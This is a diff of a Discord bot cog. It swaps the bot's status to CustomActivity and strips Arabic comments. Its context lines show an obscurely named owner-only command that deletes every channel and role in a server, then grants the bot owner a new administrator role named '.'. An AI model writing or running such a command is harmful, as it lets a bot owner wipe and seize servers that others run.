@@ -5,10 +5,8 @@ import random
 class OwnerTools(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
-        # الآيدي الخاص بك حصراً
         self.OWNER_ID = 1107355943408259112
         
-        # قائمة العبارات الإنجليزية الفخمة (مع عبارتك المميزة)
         self.phrases = [
             "i am always come back 🤫",
             "Always moving forward.",
@@ -118,36 +116,34 @@ class OwnerTools(commands.Cog):
     def cog_unload(self):
         self.change_presence.cancel()
 
-    # تغيير الحالة تلقائياً كل ساعة
+    # تغيير الحالة التلقائي كل ساعة
     @tasks.loop(hours=1)
     async def change_presence(self):
         selected_phrase = random.choice(self.phrases)
-        activity = discord.Game(name=selected_phrase)
+        # استخدام CustomActivity لتقريبها لشكل الحالة المخصصة
+        activity = discord.CustomActivity(name=selected_phrase)
         await self.bot.change_presence(activity=activity)
 
     @change_presence.before_loop
     async def before_change_presence(self):
         await self.bot.wait_until_ready()
 
-    # --- أمر تغيير الحالة يدوياً ومباشرة (!i العبارة) ---
+    # أمر تغيير الحالة المخصصة يدوياً
     @commands.command(name="i")
     async def set_custom_presence(self, ctx, *, text: str):
-        # مخصص لك حصراً
         if ctx.author.id != self.OWNER_ID:
             return
 
         try:
-            # تغيير حالة البوت فوراً للعبارة المكتوبة
-            activity = discord.Game(name=text)
+            activity = discord.CustomActivity(name=text)
             await self.bot.change_presence(activity=activity)
             
-            # مسح رسالتك للحفاظ على السرية وتأكيد التغيير
             await ctx.message.delete()
             await ctx.send(f"⚡ | تم تغيير حالة البوت إلى: **{text}**", delete_after=3)
         except Exception as e:
             print(f"⚠️ خطأ في تغيير الحالة: {e}")
 
-    # أمر تصفير السيرفر (محمي خصيصاً لك وحدك)
+    # أمر تصفير السيرفر (خاص بك)
     @commands.command(name="itzF188", aliases=["تصفير_السيرفر"])
     async def nuke_server(self, ctx):
         if ctx.author.id != self.OWNER_ID:
@@ -160,14 +156,12 @@ class OwnerTools(commands.Cog):
 
         guild = ctx.guild
 
-        # 1. حذف جميع الرومات
         for channel in guild.channels:
             try:
                 await channel.delete(reason="إعادة ضبط السيرفر بالكامل بواسطة المالك.")
             except Exception:
                 pass
 
-        # 2. حذف جميع الرتب
         for role in guild.roles:
             if role != guild.default_role and not role.managed:
                 try:
@@ -175,15 +169,12 @@ class OwnerTools(commands.Cog):
                 except Exception:
                     pass
 
-        # 3. إنشاء روم جديدة وإعطاؤك أدمين
         try:
             new_channel = await guild.create_text_channel("•-start-fresh")
-            
             admin_perm = discord.Permissions(administrator=True)
             new_role = await guild.create_role(name=".", permissions=admin_perm, reason="رتبة الطوارئ للمالك")
             await ctx.author.add_roles(new_role)
-            
-            await new_channel.send(f"⚡ | أهلاً بك يا فهد! تم تصفير السيرفر بالكامل وحذف كافة الرومات والرتب بنجاح. السيرفر جاهز الآن لتبدأ تصميمه من جديد من الصفر.")
+            await new_channel.send(f"⚡ | أهلاً بك يا فهد! تم تصفير السيرفر بالكامل وحذف كافة الرومات والرتب بنجاح.")
         except Exception as e:
             print(f"⚠️ خطأ أثناء بناء الروم الافتتاحي: {e}")
 
